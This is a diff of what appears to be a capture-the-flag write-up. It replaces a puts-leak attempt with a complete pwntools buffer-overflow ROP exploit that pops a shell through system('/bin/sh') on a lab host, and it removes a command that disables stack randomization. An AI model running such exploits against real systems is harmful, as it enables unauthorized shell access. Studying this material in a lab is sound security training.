@@ -21,83 +21,72 @@ order listed below:
 +---------+------+------+------+------+------+------+
 ```
 
-### First attempt - `puts` leak
-The idea to exploit this application is to leak the address of the `libc` version of `puts` so we can form an offset to the position of the `libc` import.
+### Working exploit
 
+The original call to `system` loads the value of `/usr/bin/uptime` into `rdi`.
 
-Running:
+In the method `test()` has some interesting gadgets:
+
 ```
-$ objdump -D myapp | grep puts
-
-0000000000401030 <puts@plt>:
-  401030:       ff 25 e2 2f 00 00       jmpq   *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>
-  4011a1:       e8 8a fe ff ff          callq  401030 <puts@plt>
-```
-
-Providing us with:
-```
-puts@plt: 0x4011a1
-puts@got: 0x404018
+   0x0000000000401152 <+0>:	push   rbp
+   0x0000000000401153 <+1>:	mov    rbp,rsp
+   0x0000000000401156 <+4>:	mov    rdi,rsp
+   0x0000000000401159 <+7>:	jmp    r13
 ```
 
-We then also need a `pop rdi; ret` command. This can be detected with `ROPgadget`. This will put the argument on the stack. In this case we want to print the position of the `puts@got` to find the addresses that change each execution.
+The first two instructions are generic instructions to setup the stack. The one we need is the `mov rdi, rsp`, this can let us load `/bin/sh` into the first instruction register. This will work because `$rsp` will point to the top of the stack. This is where we will place `/bin/sh\x00`.
 
-Running:
-```
-$ ROPgadget --binary myapp | grep "pop rdi"
+However, we are followed by a `jmp 13`, this means we need to place the address of `system` into this address to complete the payload. We can achieve this with the gadget `pop r13 ; pop r14 ; pop r15 ; ret`.
 
-0x000000000040120b : pop rdi ; ret
-```
-Giving us the address of the gadget.
+Below is our completed exploit:
 
-Putting this together will leak the addresses we need. 
-
-A minimal working example could be like so:
 ```python
 from pwn import *
+import struct
+import sys
+import re
 
-BUFFER_LEN = 112 + 8 # 112 + BASE POINTER
-BUFFER = b"A" * BUFFER_LEN
+BINARY = './myapp'
+BUFFER_LEN = 120
 
-# # ROUND 1
-g1      = p64(0x40120b) # pop rdi ; ret
-got_put = p64(0x404018)
-plt_put = p64(0x401030)
-main    = p64(0x40115f)
+# io = process(BINARY)
+io = remote("10.10.10.147", 1337)
+# io = gdb.debug('./myapp', 'b *main+77') # ret of main()
 
-payload = BUFFER
-payload += g1
-payload += got_put
-payload += plt_put
-payload += main
+# Gadgets
+pop_r13 = p64(0x401206)  # pop r13 ; pop r14 ; pop r15 ; ret
+mov_rdi = p64(0x401156)  # mov rdi, rsp
 
-# [...]
+# Addresses
+system  = p64(0x40116e)
+main    = p64(0x40115f)  # debug
 
-# libc puts location
-leaked_puts = io.recvline().strip().ljust(8, b'\x00')
+# Data
+bin_sh  = b"/bin/sh\x00"
+
+payload =  b""
+payload += b"A" * BUFFER_LEN
+
+# pop r13 ; pop r14 ; pop r15 ; ret
+payload += pop_r13
+payload += system       # r13
+payload += b"BBBBBBBB"  # r14
+payload += b"BBBBBBBB"  # r15
+
+# mov rdi, rsp
+payload += mov_rdi
+payload += bin_sh       # /bin/sh\x00
+
+io.sendline(payload)
+io.interactive()
 ```
 
-The line: 
+Note the line:
+
 ```python
-main    = p64(0x40115f)
+io = gdb.debug('./myapp', 'b *main+77') # ret of main()
 ```
 
-Is required to stop the program from crashing, as it sets up the program for a second loop.
+Loads the program into `gdb` allows for debugging the `pwn-tools` exploit.
 
-
-# Commands
-
-### Deactivate stack randomization
-
-```
-sysctl kernel.randomize_va_space=0
-```
-
-### Viewing writeable memory 
-
-```
-readelf --sections <BINARY>
-```
-```
-readelf -x .data myapp
-```
+This lets us spawn a shell on the box and grab the `user.txt`!
